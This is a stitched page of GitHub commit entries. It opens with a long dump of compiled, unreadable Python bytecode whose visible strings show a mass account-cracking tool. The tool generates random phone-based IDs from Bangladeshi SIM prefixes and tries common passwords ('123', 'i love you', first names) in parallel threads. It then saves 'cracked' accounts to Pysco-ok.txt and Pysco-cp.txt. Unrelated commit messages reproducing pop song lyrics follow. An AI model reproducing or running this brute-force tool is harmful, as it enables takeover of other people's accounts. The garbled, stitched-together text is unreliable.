x9b\x00d\tt\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\nt\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0b\x9d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x01t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x0c}\x02t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\rt\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0et\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0ft\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x10t\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x11\x9d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x12t\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00f\x04z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x03t\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00]\x9b}\x04d\x13\xa0\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x14\x84\x00t\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x15\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x05d\x13\xa0\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x16\x84\x00t\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x15\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x06d\x13\xa0\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x17\x84\x00t\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x18\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x07|\x00\xa0\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8c\x9ct!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x19\xac\x1a\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x08t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t#\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t%\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\tt\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x1b\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0bt\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0et\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x1ct\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x1dt&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x1et(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0b\x9d\x0b\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0bt\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0et\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x1ct\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x1dt&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x1ft*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00\x9d\n|\tz\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0bt\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0et\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x1ct\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x1dt&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d |\x01\x9b\x00d\x0b\x9d\x0b\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0bt\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0et\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x1ct\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x1dt&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d!\x9d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0bt\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0et\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x1ct\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x1dt&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d"\x9d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x1b\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00|\x00D\x00]Q}\n|\x01|\x05z\x00\x00\x00|\x06z\x00\x00\x00|\nz\x00\x00\x00}\x0b|\x05|\x06z\x00\x00\x00|\nz\x00\x00\x00|\x06|\nz\x00\x00\x00|\x01|\x05z\x00\x00\x00|\x06z\x00\x00\x00|\x01|\x01z\x00\x00\x00|\x01d#z\x00\x00\x00|\x01d$z\x00\x00\x00d%d&d\'d(d)d*d+g\r}\x0c|\x08\xa0\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x0b|\x0c|\t\xa6\x04\x00\x00\xab\x04\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8cR\t\x00d\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d,\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d-\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d.\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d,\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00)/Nr\x04\x00\x00\x00\xfa\r             \xfa\x05 SIM \xda\x04CODE\xfa\x02  \xe7\x9a\x99\x99\x99\x99\x99\xa9?\xe1O\x01\x00\x00\x1b[38;5;46m-\x1b[38;5;196m-\x1b[1;35m-\x1b[1;34m-\x1b[1;33m-\x1b[1;32m-\x1b[1;97m-\x1b[38;5;196m-\x1b[38;5;46m-\x1b[1;35m-\x1b[1;34m-\x1b[1;33m-\x1b[1;32m-\x1b[1;97m-\x1b[38;5;196m-\x1b[38;5;46m-\x1b[1;32m-\x1b[1;35m-\x1b[1;34m-\x1b[1;97m-\x1b[1;33m-\x1b[38;5;196m-\x1b[1;35m-\x1b[1;34m-\x1b[1;33m-\x1b[1;32m-\x1b[1;97m-\x1b[38;5;196m-\x1b[38;5;46m-\x1b[38;5;196m-\x1b[1;32m-\x1b[1;97m-\x1b[1;35m-\x1b[1;34m-\x1b[1;33m-\x1b[38;5;46m-\x1b[1;97m-\xfa\'BD : \x1b[1;97m017 , 016 , 018 , 019 , 013\xfa\x0f    INPUT CODE \xfa\x01:rQ\x00\x00\x00z\x0e \x1b[1;92m[APK] \xfa\x04    r\x89\x00\x00\x00\xf5\x03\x00\x00\x00\xe2\x88\x9a\xfa\x0f] EXAMPLE    : \xfa\x165000/10000/15000/20000\xfa"    %s[%s?%s] TOTAL IDS LIMIT : %sr\xaa\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x003\x00\x00\x00\xf3R\x00\x00\x00K\x00\x01\x00\x97\x00|\x00]"}\x01t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00V\x00\x97\x01\x01\x00\x8c#d\x00S\x00\xa9\x01N\xa9\x04\xda\x06random\xda\x06choice\xda\x06string\xda\x06digits\xa9\x02r\x95\x00\x00\x00\xda\x01_s\x02\x00\x00\x00  rl\x00\x00\x00\xfa\t<genexpr>z\x1drandom_apk.<locals>.<genexpr>\xa2\x01\x00\x00\xf3.\x00\x00\x00\xe8\x00\xe8\x00\x80\x00\xd0\x10@\xd0\x10@\xb0!\x95\x16\x94\x1d\x9dv\x9c}\xd1\x11-\xd4\x11-\xd0\x10@\xd0\x10@\xd0\x10@\xd0\x10@\xd0\x10@\xd0\x10@rz\x00\x00\x00\xe9\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x003\x00\x00\x00\xf3R\x00\x00\x00K\x00\x01\x00\x97\x00|\x00]"}\x01t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00V\x00\x97\x01\x01\x00\x8c#d\x00S\x00r\xca\x00\x00\x00r\xcb\x00\x00\x00r\xd0\x00\x00\x00s\x02\x00\x00\x00  rl\x00\x00\x00r\xd2\x00\x00\x00z\x1drandom_apk.<locals>.<genexpr>\xa3\x01\x00\x00r\xd3\x00\x00\x00rz\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x003\x00\x00\x00\xf3R\x00\x00\x00K\x00\x01\x00\x97\x00|\x00]"}\x01t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00V\x00\x97\x01\x01\x00\x8c#d\x00S\x00r\xca\x00\x00\x00r\xcb\x00\x00\x00r\xd0\x00\x00\x00s\x02\x00\x00\x00  rl\x00\x00\x00r\xd2\x00\x00\x00z\x1drandom_apk.<locals>.<genexpr>\xa4\x01\x00\x00\xf3.\x00\x00\x00\xe8\x00\xe8\x00\x80\x00\xd0\x0f?\xd0\x0f?\xb0\x11\x95\x06\x94\r\x9df\x9cm\xd1\x10,\xd4\x10,\xd0\x0f?\xd0\x0f?\xd0\x0f?\xd0\x0f?\xd0\x0f?\xd0\x0f?rz\x00\x00\x00\xe9\x04\x00\x00\x00rM\x00\x00\x00\xa9\x01\xda\x0bmax_workersr\xa9\x00\x00\x00r\x8a\x00\x00\x00r\x8b\x00\x00\x00\xfa\x14 YOUR NAME :\x1b[1;92m \xfa\x18 TOTAL IDS :\x1b[38;5;192m \xfa\x14 SIM CODE  :\x1b[1;92m \xfa\x1d NETWORK   :\x1b[1;92m DATA/WIFI\xfaL TURN [\x1b[1;92mON\x1b[1;92m/\x1b[38;5;196mOFF\x1b[1;37m] AIRPLANE MODE IN EVERY 5 MIN \xda\x03123\xda\x041234\xda\nBangladesh\xfa\ni love you\xf5\x18\x00\x00\x00\xe0\xa6\xac\xe0\xa6\xbe\xe0\xa6\x82\xe0\xa6\xb2\xe0\xa6\xbe\xe0\xa6\xa6\xe0\xa7\x87\xe0\xa6\xb6\xda\x05Tamim\xda\x07Sanjida\xda\x06Jannat\xda\x05Sadiar\xb5\x00\x00\x00\xf5+\x00\x00\x00 [\xe2\x9c\x94] Crack Process Has Been Completed\xf0\x9f\x8c\xba\xf5-\x00\x00\x00 [\xe2\x9c\x94] Ids Saved In Pysco-ok.txt,Pysco-cp.txt)\x19r~\x00\x00\x00r\x7f\x00\x00\x00r\x86\x00\x00\x00r\x85\x00\x00\x00r9\x00\x00\x00r<\x00\x00\x00rA\x00\x00\x00rt\x00\x00\x00ru\x00\x00\x00r\xad\x00\x00\x00r>\x00\x00\x00\xda\x03intr?\x00\x00\x00r\x9f\x00\x00\x00\xda\x04joinr_\x00\x00\x00\xda\nThreadPoolre\x00\x00\x00r\x9d\x00\x00\x00r\xa1\x00\x00\x00\xda\x05unamer\x9e\x00\x00\x00\xda\x06submit\xda\x03apk\xda\x04exit\xa9\r\xda\x04user\xda\x04kode\xda\x06doamin\xda\x05limit\xda\x04nmbr\xda\x04koda\xda\x04kodb\xda\x03nmp\xda\x05yaari\xda\x02tl\xda\x04guru\xda\x03uid\xda\x03pwxs\r\x00\x00\x00             rl\x00\x00\x00r\xae\x00\x00\x00r\xae\x00\x00\x00\x93\x01\x00\x00s\x7f\x04\x00\x00\x80\x00\xd8\x06\x08\x80\x14\xdd\x01\x03\x84\x19\x887\xd1\x01\x13\xd4\x01\x13\xd0\x01\x13\xdd\x01\x07\x81\x18\x84\x18\x80\x18\xdd\x01\x06\xd0\x07+\x95q\xd0\x07+\xd0\x07+\x9dq\xd0\x07+\xd0\x07+\xa5a\xd0\x07+\xd0\x07+\xd0\x07+\xd1\x01,\xd4\x01,\xd0\x01,\xadT\xacZ\xb8\x04\xd1-=\xd4-=\xd0-=\xdd\x01\x06\xf0\x00\x00\x08H\x07\xf1\x00\x00\x02I\x07\xf4\x00\x00\x02I\x07\xf0\x00\x00\x02I\x07\xdd\x01\x06\xd0\x079\x8dA\xd0\x079\xd0\x079\xd0\x079\xd1\x01:\xd4\x01:\xd0\x01:\xdd\x01\x06\xf0\x00\x00\x08H\x07\xf1\x00\x00\x02I\x07\xf4\x00\x00\x02I\x07\xf0\x00\x00\x02I\x07\xdd\x08\r\x95\x11\xd0\x0e+\xd0\x0e+\xa51\xd0\x0e+\xd0\x0e+\xa5q\xd0\x0e+\xd0\x0e+\xd0\x0e+\xd1\x08,\xd4\x08,\x80\x14\xdd\x01\x03\x84\x19\x887\xd1\x01\x13\xd4\x01\x13\xd0\x01\x13\xdd\x01\x07\x81\x18\x84\x18\x80\x18\xd8\n\x1d\x80\x16\xdd\x01\x06\xd0\x07C\x8da\xd0\x07C\xd0\x07C\x95!\xd0\x07C\xd0\x07C\x9d\x01\xd0\x07C\xd0\x07C\xad!\xd0\x07C\xd0\x07C\xd0\x07C\xd1\x01D\xd4\x01D\xd0\x01D\xdd\t\x0c\x8dU\xd0\x138\xbd!\xbdA\xbda\xc5\x01\xb8\x19\xd1\x13B\xd1\rC\xd4\rC\xd1\tD\xd4\tD\x80\x15\xdd\r\x12\x905\x89\\\x8c\\\xf0\x00\x04\x02\x13\xf0\x00\x04\x02\x13\x80T\xd8\t\x0b\x8f\x17\x8a\x17\xd0\x10@\xd0\x10@\xb5u\xb8Q\xb1x\xb4x\xd0\x10@\xd1\x10@\xd4\x10@\xd1\t@\xd4\t@\x80$\xd8\t\x0b\x8f\x17\x8a\x17\xd0\x10@\xd0\x10@\xb5u\xb8Q\xb1x\xb4x\xd0\x10@\xd1\x10@\xd4\x10@\xd1\t@\xd4\t@\x80$\xd8\x08\n\x8f\x07\x8a\x07\xd0\x0f?\xd0\x0f?\xb5e\xb8A\xb1h\xb4h\xd0\x0f?\xd1\x0f?\xd4\x0f?\xd1\x08?\xd4\x08?\x80#\xd8\x02\x06\x87+\x82+\x88c\xd1\x02\x12\xd4\x02\x12\xd0\x02\x12\xd0\x02\x12\xdd\x06\x10\x98S\xd0\x06!\xd1\x06!\xd4\x06!\xf0\x00\x0e\x02 \xa0U\xdd\x02\x04\x84)\x88G\xd1\x02\x14\xd4\x02\x14\xd0\x02\x14\xdd\x02\x08\x81(\x84(\x80(\xdd\x07\n\x8d3\x88t\x899\x8c9\x81~\x84~\x80"\xdd\x02\x07\xd0\x08;\xd1\x02<\xd4\x02<\xd0\x02<\xdd\x02\x07\xd0\x08>\x8dA\xd0\x08>\xd0\x08>\x95\x01\xd0\x08>\xd0\x08>\x95A\xd0\x08>\xd0\x08>\x9d\x05\xd0\x08>\xd0\x08>\xb5e\xd0\x08>\xd0\x08>\xd0\x08>\xd1\x02?\xd4\x02?\xd0\x02?\xdd\x02\x07\xd0\x08A\x8dA\xd0\x08A\xd0\x08A\x95\x01\xd0\x08A\xd0\x08A\x95A\xd0\x08A\xd0\x08A\x9d\x05\xd0\x08A\xd0\x08A\xbd%\xd0\x08A\xd0\x08A\xc0"\xd1\x08D\xd1\x02E\xd4\x02E\xd0\x02E\xdd\x02\x07\xd0\x08=\x8dA\xd0\x08=\xd0\x08=\x95\x01\xd0\x08=\xd0\x08=\x95A\xd0\x08=\xd0\x08=\x9d\x05\xd0\x08=\xd0\x08=\xb0d\xd0\x08=\xd0\x08=\xd0\x08=\xd1\x02>\xd4\x02>\xd0\x02>\xdd\x02\x07\xd0\x08?\x8dA\xd0\x08?\xd0\x08?\x95\x01\xd0\x08?\xd0\x08?\x95A\xd0\x08?\xd0\x08?\x9d\x05\xd0\x08?\xd0\x08?\xd0\x08?\xd1\x02@\xd4\x02@\xd0\x02@\xdd\x02\x07\xd0\x08w\x8dA\xd0\x08w\xd0\x08w\x95\x01\xd0\x08w\xd0\x08w\x95A\xd0\x08w\xd0\x08w\x9d\x05\xd0\x08w\xd0\x08w\xd0\x08w\xd1\x02x\xd4\x02x\xd0\x02x\xdd\x02\x07\xd0\x08;\xd1\x02<\xd4\x02<\xd0\x02<\xd8\x0e\x12\xf0\x00\x03\x03 \xf0\x00\x03\x03 \x80d\xd8\t\r\x88d\x89\x19\x904\x89\x1e\x98\x04\xd1\t\x1c\x803\xd8\n\x0e\x88t\x89)\x90D\x89.\x98\x14\x98d\x99\x19\xa04\xa8\x04\xa19\xa8T\xa1>\xb0$\xb0t\xb1)\xb8D\xc0\x15\xb9J\xc0t\xc8F\xc1{\xd0S_\xd0`l\xf0\x00\x00n\x01H\x02\xf0\x00\x00I\x02P\x02\xf0\x00\x00Q\x02Z\x02\xf0\x00\x00[\x02c\x02\xf0\x00\x00d\x02k\x02\xf0\x00\x00\nl\x02\x803\xd8\x03\x08\x87<\x82<\x95\x03\x90C\x98\x03\x98B\xd1\x03\x1f\xd4\x03\x1f\xd0\x03\x1f\xd0\x03\x1f\xf0\x07\x03\x03 \xf0\x17\x0e\x02 \xf0\x00\x0e\x02 \xf0\x00\x0e\x02 \xf1\x00\x0e\x02 \xf4\x00\x0e\x02 \xf0\x00\x0e\x02 \xf0\x00\x0e\x02 \xf0\x00\x0e\x02 \xf0\x00\x0e\x02 \xf0\x00\x0e\x02 \xf0\x00\x0e\x02 \xf8\xf8\xf8\xf0\x00\x0e\x02 \xf0\x00\x0e\x02 \xf0\x00\x0e\x02 \xf0\x00\x0e\x02 \xf5\x1e\x00\x02\x07\x80v\x81\x1d\x84\x1d\x80\x1d\xdd\x01\x06\xd0\x074\xd1\x015\xd4\x015\xd0\x015\xdd\x01\x06\xd0\x076\xd1\x017\xd4\x017\xd0\x017\xdd\x01\x06\x80v\x81\x1d\x84\x1d\x80\x1d\xdd\x01\x05\x81\x16\x84\x16\x80\x16\x80\x16\x80\x16s\x13\x00\x00\x00\xc8\x04F6O\x07\x03\xcf\x07\x04O\x0b\x07\xcf\x0e\x01O\x0b\x07c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00\x03\x00\x00\x00\xf3f\x08\x00\x00\x97\x00g\x00}\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x03t\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x04t\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x05\x9d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x08\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05t\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x08\x9d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05t\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\t\x9d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\nt\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0bt\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0c\x9d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x01t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\r}\x02t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0et\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0ft\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x10t\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x11t\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x12\x9d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x13\x00\x00\x00\x00\x00\x00\x…

---
## [Danielkaas94/DTAP](https://github.com/Danielkaas94/DTAP)@[d0df1db0ad...](https://github.com/Danielkaas94/DTAP/commit/d0df1db0ade670cca1e56d8b93abb55f856e94cb)
#### Wednesday 2023-09-27 18:57:46 by Daniel Kaas Bundgaard Jørgensen

Burnin' for You

Home in the valley
Home in the city
Home isn't pretty
Ain't no home for me

Home in the darkness
Home on the highway
Home isn't my way
Home I'll never be

Burn out the day
Burn out the night
I can't see no reason to put up a fight

I'm living for givin' the devil his due
And I'm burnin', I'm burnin', I'm burnin' for you
I'm burnin', I'm burnin', I'm burnin' for you

Time is the essence
Time is the season
Time ain't no reason
Got no time to slow

Time everlasting
Time to play b sides
Time ain't on my side
Time I'll never know

Burn out the day
Burn out the night
I'm not the one to tell you what's wrong and what's right
I've seen suns that were freezing and lives that were through
But I'm burnin', I'm burnin', I'm burnin' for you
I'm burnin', I'm burnin', I'm burnin' for you

Burn out the day
Burn out the night
I can't see no reason to put up a fight
I'm living for givin' the devil his due
And I'm burnin', I'm burnin', I'm burnin' for you
I'm burnin', I'm burnin', I'm burnin' for you
I'm burnin', I'm burnin', I'm burnin' for you
And I'm burnin', I'm burnin', I'm burnin' for you

---
## [Danielkaas94/DTAP](https://github.com/Danielkaas94/DTAP)@[dd3a42ca30...](https://github.com/Danielkaas94/DTAP/commit/dd3a42ca30cd67298d004429558a916a7efa0613)
#### Wednesday 2023-09-27 18:59:30 by Daniel Kaas Bundgaard Jørgensen

More Than a Feeling 🫂❣️

I looked out this morning and the sun was gone
Turned on some music to start my day
I lost myself in a familiar song
I closed my eyes and I slipped away

It's more than a feeling
(More than a feeling)
When I hear that old song they used to play
(More than a feeling)
I begin dreaming
(More than a feeling)
'Til I see Marianne walk away
I see my Marianne walkin' away

So many people have come and gone
Their faces fade as the years go by
Yet I still recall as I wander on
As clear as the sun in the summer sky

It's more than a feeling
(More than a feeling)
When I hear that old song they used to play
(More than a feeling)
I begin dreaming
(More than a feeling)
'Til I see Marianne walk away
I see my Marianne walkin' away

When I'm tired and thinking cold
I hide in my music, forget the day
And dream of a girl I used to know
I closed my eyes and she slipped away
She slipped away

It's more than a feeling
(More than a feeling)
When I hear that old song they used to play
(More than a feeling)
I begin dreaming
(More than a feeling)
'Til I see Marianne walk away

---
## [Danielkaas94/DTAP](https://github.com/Danielkaas94/DTAP)@[0adaef2741...](https://github.com/Danielkaas94/DTAP/commit/0adaef2741c585a53259bc8611949de9f9a5e6a2)
#### Wednesday 2023-09-27 19:01:01 by Daniel Kaas Bundgaard Jørgensen

❤️‍🔥 Burnin' for You ❤️‍🔥

Home in the valley
Home in the city
Home isn't pretty
Ain't no home for me

Home in the darkness
Home on the highway
Home isn't my way
Home I'll never be

Burn out the day
Burn out the night
I can't see no reason to put up a fight

I'm living for givin' the devil his due
And I'm burnin', I'm burnin', I'm burnin' for you
I'm burnin', I'm burnin', I'm burnin' for you ❤️‍🔥

Time is the essence
Time is the season
Time ain't no reason
Got no time to slow

Time everlasting
Time to play b sides
Time ain't on my side
Time I'll never know

